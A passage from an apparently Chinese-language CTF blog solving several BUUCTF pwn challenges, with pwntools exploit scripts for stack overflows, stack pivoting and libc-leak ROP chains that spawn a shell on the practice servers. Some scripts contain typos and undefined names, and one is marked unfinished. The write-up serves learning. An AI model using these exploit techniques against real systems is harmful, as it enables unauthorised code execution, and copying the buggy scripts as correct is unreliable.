<p>运行一下看看，没什么用</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505932.png" alt="image-20240703192803742"></p>
<p>ida里面看一眼</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505942.png" alt="image-20240703193559582"></p>
<p>感觉是我们要找的，看一下函数的地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031505958.png" alt="image-20240703200415154"></p>
<p>找一下溢出点，应该就是这个read函数</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506491.png" alt="image-20240703193821687"></p>
<p>v4是136，而最大长度是256，存在溢出</p>
<p>感觉就是简单的后门</p>
<p>编写一下exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26798</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">8</span>)+p64(<span class="number">0x400620</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是注意的是要看一下汇编代码</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506461.png" alt="image-20240703200506055"></p>
<p>这里直接进行rsp-88h，并没有进行push rbp，所以不用带着后面的8</p>
<p><strong>正常情况</strong></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506816.png" alt="image-20240703200847001"></p>
<p>然后就可以进行正常的解题了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506927.png" alt="image-20240703200628494"></p>
<p>flag{8140653e-8223-41a2-8383-e4ccc40cda23}</p>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>2024.7.4</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506813.png" alt="image-20240704103016516"></p>
<p>日常检查，32位，NX保护，随便运行一下看看</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506334.png" alt="image-20240704103058100"></p>
<p>扔进ida里面，</p>
<p>一眼就看见了hack，很简单的感觉就是一个简单的后门,看一下地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506080.png" alt="image-20240704104727132"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506608.png" alt="image-20240704103309413"></p>
<p>看看找找溢出点，很明显的read函数存在溢出</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506938.png" alt="image-20240704103419832"></p>
<p>就是简单的后门函数</p>
<p>简单编写一下exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29448</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(<span class="number">0x804854B</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506367.png" alt="image-20240704105211549"></p>
<p>果然是个钩子，其实我们只能看见flag这四个字节，但是后面缺少，这里搜索一下就知道是因为溢出长度不够了，s的ebp+ret正好是44，而我们的最大长度为48，只剩下4个字节，溢出为flag。</p>
<p>SO,这里就用到了</p>
<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>工具看一下有没有&#x2F;bin&#x2F;sh的地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031506951.png" alt="image-20240704105516236"></p>
<p>我们可以看见system函数的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x8048400</span></span><br></pre></td></tr></table></figure>

<p>利用过程：</p>
<ul>
<li><p>一、泄露ebp</p>
</li>
<li><p>二、找到参数s在栈上的位置</p>
</li>
<li><p>三、布置s栈上的值</p>
</li>
<li><p>四、栈劫持、获取shell</p>
</li>
</ul>
<blockquote>
<p>一、printf函数在输出的时候遇到’\0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’\0‘，那样就会将ebp连带着输出。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28155</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_es_2&quot;)</span></span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x8048400</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x27</span> + <span class="string">&#x27;p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(ebp))</span><br><span class="line">payload = (<span class="string">&#x27;this&#x27;</span>+p32(sys_addr)+<span class="string">&#x27;aaaa&#x27;</span>+p32(ebp-<span class="number">0x28</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;p&#x27;</span>)+p32(ebp-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">                                      <span class="comment">#指向&#x27;/bin/sh&#x27; 								#指向this,也就是我们栈劫持的地方</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>









































<h2 id="HarekazeCTF2019-baby-rop-2"><a href="#HarekazeCTF2019-baby-rop-2" class="headerlink" title="[HarekazeCTF2019]baby_rop 2"></a>[HarekazeCTF2019]baby_rop 2</h2><p>2024.7.5</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031507674.png" alt="image-20240705161402820"></p>
<p>NX保护，64位，ida进去看一眼</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031507505.png" alt="image-20240705161910172"></p>
<p>read函数的溢出，（0x20+8）但是感觉找不到溢出点，这里肯定就是泄露libc版本了。</p>
<p>这里利用printf泄露read函数进行泄露地址计算libc的基址，ROP链构造system（’&#x2F;bin&#x2F;sh‘）</p>
<blockquote>
<p>这里的需要的params是rdi和rsi</p>
</blockquote>
<p>工具查看一下：ROPgadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdi_addr=<span class="number">0x400733</span></span><br><span class="line">rsi_addr=<span class="number">0x400731</span></span><br></pre></td></tr></table></figure>

<p>但是这里要注意的是：</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031507911.png" alt="image-20240705164701562"></p>
<p>他这里跟了一个pop r15，这里说是无所谓。不管他，不过这里的got表的地址为read函数的。</p>
<p>还有就是要设置第一个参数。<strong>0x400770</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foramt_str=<span class="number">0x400770</span></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031507243.png" alt="image-20240705165814818"></p>
<p>简单写一下payload</p>
<blockquote>
<p>payload&#x3D; b’a’*(0x20+8)+p64(rdi_addr)+p64(foramt_str)+p64(rsi_addr)+p64(read_got)+p64(0)+p64(printf_plt)+p64(mian_addr)</p>
</blockquote>
<p>最后接收一下输出的read函数地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, &#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>



<p>完整的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27046</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x400733</span></span><br><span class="line">rsi_addr=<span class="number">0x400731</span></span><br><span class="line">foramt_str=<span class="number">0x400770</span></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(rdi_addr)+p64(foramt_str)+p64(rsi_addr)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(mian_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,read_addr)</span><br><span class="line">base_addr = puts_addr - lib.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = base_addr + lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(lib.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))<span class="comment">#next为python3所用的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(rdi_addr)+p64(foramt_str)+p64(rsi_addr)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(mian_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>放着先！</p>
<p><strong>okok，2024.7.12回头看一手这道题</strong></p>
<h3 id="利用read函数泄露libc基址"><a href="#利用read函数泄露libc基址" class="headerlink" title="利用read函数泄露libc基址"></a>利用read函数泄露libc基址</h3><p>看了一下是利用read函数泄露libc基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25489</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x0000000000400733</span> </span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400731</span> </span><br><span class="line">format_str= <span class="number">0x400770</span> </span><br><span class="line">ret_addr=<span class="number">0x00000000004004d1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(format_str)+p64(pop_rsi_r15)+p64(read_got) + p64(<span class="number">0</span>)+p64(printf_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gets_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件库</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>),ret_addr,pop_rdi,bin_sh,system_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解决</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031507136.png" alt="image-20240712104204310"></p>
<p>flag{7e2a13b8-02d1-4c2f-b9d1-e14ff995354c}</p>
<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><p>2024.7.6</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031507971.png" alt="image-20240706104037117"></p>
<p>日常检查，32位，NX保护，运行一下，没啥用</p>
<p>ida打开看看，感觉就是栈溢出的问题。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607932.png" alt="image-20240712111311989"></p>
<h3 id="整数溢出-printf函数libc版本泄露"><a href="#整数溢出-printf函数libc版本泄露" class="headerlink" title="整数溢出+printf函数libc版本泄露"></a>整数溢出+printf函数libc版本泄露</h3><p>printf函数泄露libc版本</p>
<blockquote>
<ol>
<li><strong>一开始输入负数，绕过长度限制，造成溢出</strong></li>
<li><strong>利用printf函数泄露程序的libc版本，去算出system和‘&#x2F;bin&#x2F;sh‘的地址</strong></li>
<li><strong>溢出覆盖返回地址去执行system（‘&#x2F;bin&#x2F;sh’）</strong></li>
</ol>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params1</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+ p32(printf_plt) + p32(main_addr) + p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建一下libc</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;printf&quot;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&quot;printf&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>),system_addr,mian_addr,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>









<h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h2><p>2024.7.6</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031507678.png" alt="image-20240706104728558"></p>
<p>32位，NX保护，简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607933.png" alt="image-20240706112212568"></p>
<p>ida打开，</p>
<p>看见了gets函数漏洞，栈溢出，看一下（0x18+4）</p>
<p>找一下溢出点，找到了flag.txt，先试试是不是简单后门函数。</p>
<p>满足这个应该就是可以输出flag</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607934.png" alt="image-20240706112338581"></p>
<p>这里就是要满足这三个条件就可以了。</p>
<p> 首先找找这两个win1和win2</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508754.png" alt="image-20240706112637838"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508794.png" alt="image-20240706112642161"></p>
<p>覆盖一下这两个函数，<strong>函数1：0x80485CB和函数2：0x80485D8</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28834</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">win_function1=<span class="number">0x80485CB</span></span><br><span class="line">win_function2=<span class="number">0x80485D8</span></span><br><span class="line">flag_addr=<span class="number">0x804862B</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(win_function1)+p32(win_function2)+p32(flag_addr)+p32(<span class="number">0xBAAAAAAD</span>)+p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Enter your input&gt; &#x27;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>









<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><p>2024.7.15</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508577.png" alt="image-20240715153318264"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508406.png" alt="image-20240715153615153"></p>
<p>ida打开看看，有个read函数的溢出漏洞</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508618.png" alt="image-20240715154253419"></p>
<p>看一眼字符串</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508227.png" alt="image-20240715154421573"></p>
<p>嘶！感觉就是最基本的libc版本泄露，自己先整整看。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28036</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libic</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>























































<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>2024.7.6</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508008.png" alt="image-20240706115559095"></p>
<p>日常检查，只开了一个relro，32位</p>
<p>看了一眼，找一下漏洞</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">........</span><br><span class="line"> <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vuln</span>(s, <span class="number">0x400u</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">........</span><br><span class="line"><span class="function"><span class="type">void</span> *__cdecl <span class="title">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//看出是存在栈溢出漏洞的</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解题思路：写入shellcode到s，s中的内容复制到vuln函数中的dest然后溢出，控制程序指向shelldode执行。</p>
<ul>
<li>首先要绕过一下这个if条件语句</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vuln</span>(s, <span class="number">0x400u</span>);</span><br><span class="line"><span class="comment">//这块的意思是当result为假时，执行下面的语句</span></span><br><span class="line"><span class="comment">//也就是让result为0或NULL时</span></span><br><span class="line"><span class="comment">//在往上看看</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);</span><br><span 